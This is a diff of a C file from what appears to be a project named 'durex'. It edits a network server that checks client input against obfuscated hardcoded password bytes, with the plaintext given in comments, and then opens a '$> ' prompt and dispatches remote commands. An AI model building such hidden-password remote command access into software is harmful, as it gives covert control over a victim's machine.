@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 03:19:03 by root              #+#    #+#             */
-/*   Updated: 2018/08/17 19:51:50 by root             ###   ########.fr       */
+/*   Updated: 2018/08/18 05:58:00 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -16,7 +16,7 @@
 #include <netdb.h>
 /* inet_ntop */
 #include <arpa/inet.h>
-
+							#include <stdio.h>
 #include "main.h"
 #include "durex.h"
 
@@ -101,7 +101,7 @@ void					serverAcceptConnections()
 	close(fd);
 }
 
-static int			umystrcmp(u_char *s1, u_char *s2)
+static int			myustrcmp(u_char *s1, u_char *s2)
 {
 	size_t			i;
 
@@ -116,9 +116,7 @@ static void			serverLogging(u_char *buff, int size, t_cl *client)
 	mymemset(buff + size, 0, SERVER_CLIENT_BUFF - size);
 	encrypt(buff, size);
 	//kata (4): 201 121 30 74
-	//KATA (4): 44 92 192 65
-	//KatA (4): 116 103 224 84
-	if (umystrcmp(buff, (u_char []){ 201, 121, 30, 74, 0 }) == 3) {
+	if (myustrcmp(buff, (u_char []){ 201, 121, 30, 74, 0 }) == 3) {
 		client->logged = 1;
 		clientWrite("$> ", client);
 	} else {
@@ -129,10 +127,10 @@ static void			serverLogging(u_char *buff, int size, t_cl *client)
 static void			serverCommands(char *buff, t_cl *client)
 {
 	static t_cmd	cmds[] = { SERVER_COMMANDS };
-	size_t			i;
 
-	for (i = 0; i < sizeof(cmds) / sizeof(*cmds); i++) {
-		if (!mystrcmp(cmds[i].name, buff)) {
+	for (size_t i = 0; i < sizeof(cmds) / sizeof(*cmds); i++) {
+		int ret = mystrcmp(buff, cmds[i].name);
+		if (ret == 0 || ret == ' ') {
 			cmds[i].func(client, cmds);
 			break ;
 		}
